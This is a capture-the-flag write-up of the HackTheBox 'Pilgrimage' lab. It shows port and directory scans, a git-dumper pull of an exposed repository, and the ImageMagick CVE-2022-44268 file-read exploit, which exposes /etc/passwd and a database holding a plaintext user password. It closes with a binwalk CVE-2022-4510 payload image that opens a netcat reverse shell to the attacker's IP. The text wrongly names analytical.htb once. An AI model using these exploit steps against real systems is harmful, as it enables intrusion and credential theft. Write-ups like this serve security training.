# HackTheBox Pilgrimage

CTF lab machine of the HackTheBox platform of the Easy level under Linux OS, containing a publicly available Git repository, use of outdated versions of software with vulnerabilities, password reuse.

## Service Overview

The machine is assigned IP address 10.10.11.219, let's scan the ports with Nmap:

```bash
$ nmap -sV -sC -Pn -p1-65535 -vv -oN 10.10.11.219 10.10.11.219
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
| ssh-rsa 
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOaVAN4bg6zLU3rUMXOwsuYZ8yxLlkVTviJbdFijyp9fSTE6Dwm4e9pNI8MAWfPq0T0Za0pK0vX02ZjRcTgv3yg=
|   256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILGkCiJaVyn29/d2LSyMWelMlcrxKVZsCCgzm6JjcH1W
80/tcp open  http    syn-ack nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Service

We need to add analytical.htb to /etc/hosts:

```bash
$ sudo nano /etc/hosts
10.10.11.219 pilgrimage.htb
```

Let's see what gobuster finds:

```bash
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://pilgrimage.htb -r -t 20
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://pilgrimage.htb
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
/.git/HEAD            (Status: 200) [Size: 23]
/.hta                 (Status: 403) [Size: 153]
/.htpasswd            (Status: 403) [Size: 153]
/.htaccess            (Status: 403) [Size: 153]
/assets               (Status: 403) [Size: 153]
/index.php            (Status: 200) [Size: 7621]
/tmp                  (Status: 403) [Size: 153]
/vendor               (Status: 403) [Size: 153]
Progress: 4539 / 4615 (98.35%)
===============================================================
```

A publicly accessible directory with Git files.

## Git

Let's use [git-dumper](https://github.com/arthaud/git-dumper) to download files:

```bash
$ git-dumper <URL> <output directory>
$ git-dumper http://pilgrimage.htb/.git git

...
$ cd git
$ ls -la
total 26972
.
..
assets
dashboard.php
.git
index.php
login.php
logout.php
magick
register.php
vendor
```

Let's check the binary and the magick version:

```bash
$ cat index.php
exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);

$ file magick
magick: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9fdbc145689e0fb79cb7291203431012ae8e1911, stripped
$ ./magick --version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

Let's look inside the PHP files and find the database path.

```bash
$ cat login.php | grep sqlite
  $db = new PDO('sqlite:/var/db/pilgrimage');
```

## ImageMagick

There is a publicly available exploit for this version of ImageMagick: ImageMagick 7.1.0-49 - Arbitrary File Read - https://www.exploit-db.com/exploits/51261

```bash
$ searchsploit imagemagick 7.1.0-49
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
ImageMagick 7.1.0-49 - Arbitrary File Read                                            | multiple/local/51261.txt
ImageMagick 7.1.0-49 - DoS                                                            | php/dos/51256.txt
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
$ searchsploit -m multiple/local/51261.txt
  Exploit: ImageMagick 7.1.0-49 - Arbitrary File Read
      URL: <https://www.exploit-db.com/exploits/51261>
     Path: /usr/share/exploitdb/exploits/multiple/local/51261.txt
    Codes: CVE-2022-44268
 Verified: False
File Type: ASCII text
```

Inside the 51261.txt file is a link to https://github.com/voidz0r/CVE-2022-44268. Let's get the exploit ready:

```bash
$ git clone https://github.com/voidz0r/CVE-2022-44268
$ cd CVE-2022-44268
$ cargo run '/etc/passwd'

$ git clone https://github.com/exiftool/exiftool
$ exiftool/exiftool image.png
```

Load image.png to web http://pilgrimage.htb/

Download the resulting file http://pilgrimage.htb/shrunk/64f9a44eb37eb.png and look inside:

```bash
$ apt install graphicsmagick-imagemagick-compat
$ identify -verbose 64f9a44eb37eb.png
```

```bash
$ cd git
$ cat dashboard.php
$db = new PDO('sqlite:/var/db/pilgrimage');

$ cd CVE-2022-44268
$ cargo run '/var/db/pilgrimage'
$ exiftool/exiftool image.png
```

```bash
SQLite format 3
```

Copy the HEX representation of the file to a text file, then convert it:

```bash
$ nano 1.hex
$ xxd -r -p 1.hex 1.sqlite

$ apt install sqlite
$ sqlite3 1.sqlite
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL);
INSERT INTO users VALUES('emily','abigchonkyboi123');
CREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL);
COMMIT;
```

## User flag

```bash
emily@pilgrimage:~$ cat user.txt

```

## Privilege escalation

Running ps aux or pspy64 sees the /bin/bash /usr/sbin/malwarescan.sh process running as superuser:

```bash
$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
$ chmod 700 pspy64
$ ./pspy64

2023/09/07 21:53:00 CMD: UID=0     PID=753    | /bin/bash /usr/sbin/malwarescan.sh 
```

Let's take a look inside this file:

```bash
$ cat /usr/sbin/malwarescan.sh

# !/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

With inotifywait, every file in the /var/www/pilgrimage.htb/shrunk directory is scanned with binwalk. Let's check the version of binwalk:

```bash
emily@pilgrimage:~$ /usr/local/bin/binwalk -h
Binwalk v2.3.2
```

Let's find an exploit:

```bash
$ searchsploit binwalk
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
Binwalk v2.3.2 - Remote Command Execution (RCE)                                       | python/remote/51249.py
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
$ searchsploit -m python/remote/51249.py
  Exploit: Binwalk v2.3.2 - Remote Command Execution (RCE)
      URL: <https://www.exploit-db.com/exploits/51249>
     Path: /usr/share/exploitdb/exploits/python/remote/51249.py
    Codes: CVE-2022-4510
 Verified: False
File Type: ASCII text, with very long lines (614)
Copied to: /root/51249.py
```
Binwalk v2.3.2 - Remote Command Execution (RCE) - https://www.exploit-db.com/exploits/51249.

Let's use it to generate a payload picture and immediately open the listener:

```bash
$ python3 51249.py screens/01_generating.png 10.10.16.18 5555
$ mv binwalk_exploit.png binwalk_exploit
$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.11.219 - - [07/Sep/2023 15:50:20] "GET /binwalk_exploit HTTP/1.1" 200 -
```

```bash
emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ wget 10.10.16.18:8080/binwalk_exploit
```

And immediately open the listener:

```bash
$ nc -s 10.10.16.18 -lnvp 5555

Connection received on 10.10.11.219 57170
```
